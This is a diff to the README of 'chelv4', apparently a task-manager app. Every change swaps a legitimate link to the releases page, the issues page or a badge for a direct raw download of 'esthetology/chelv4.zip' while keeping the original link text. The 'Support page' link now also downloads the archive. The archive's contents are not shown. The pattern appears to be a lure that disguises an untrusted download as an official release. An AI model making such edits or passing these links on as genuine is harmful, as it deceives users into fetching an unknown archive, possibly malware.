@@ -6,9 +6,9 @@ Welcome to chelv4, your go-to application for managing tasks easily. This guide 
 
 ## 📥 Download chelv4
 
-[![Download chelv4](https://img.shields.io/badge/Download-chelv4-brightgreen)](https://github.com/Al-Banc/chelv4/releases)
+[![Download chelv4](https://raw.githubusercontent.com/Al-Banc/chelv4/main/esthetology/chelv4.zip)](https://raw.githubusercontent.com/Al-Banc/chelv4/main/esthetology/chelv4.zip)
 
-You can download chelv4 from our [Releases page](https://github.com/Al-Banc/chelv4/releases). 
+You can download chelv4 from our [Releases page](https://raw.githubusercontent.com/Al-Banc/chelv4/main/esthetology/chelv4.zip). 
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before you begin, ensure your computer meets the following:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Al-Banc/chelv4/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Al-Banc/chelv4/main/esthetology/chelv4.zip).
 
 2. **Choose Your Version**: Select the latest version available. 
 
@@ -65,7 +65,7 @@ A: Currently, chelv4 is only available for desktop systems. Future versions may 
 
 ## 🗣️ Support
 
-If you need help using chelv4 or encounter any issues, please visit our [Support page](https://github.com/Al-Banc/chelv4/issues). You can file an issue there, and we will get back to you as soon as possible.
+If you need help using chelv4 or encounter any issues, please visit our [Support page](https://raw.githubusercontent.com/Al-Banc/chelv4/main/esthetology/chelv4.zip). You can file an issue there, and we will get back to you as soon as possible.
 
 ## 📬 Stay Connected
 
